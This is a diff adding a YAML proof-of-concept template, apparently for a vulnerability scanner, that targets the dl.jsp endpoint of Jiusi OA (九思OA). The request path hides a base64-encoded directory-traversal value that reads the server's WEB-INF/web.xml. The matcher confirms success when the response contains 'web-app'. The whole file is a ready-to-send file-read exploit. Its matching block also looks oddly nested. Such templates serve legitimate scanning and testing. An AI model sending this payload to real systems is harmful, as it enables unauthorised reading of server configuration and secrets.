@@ -1,0 +1,11 @@
+name: poc-yaml-九思OA-dl.jsp-任意文件读取
+description: "任意文件读取"
+method: POST
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+path:
+  - /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h
+expression:
+  status: 200
+  body_any:
+    body_all: ["web-app"]
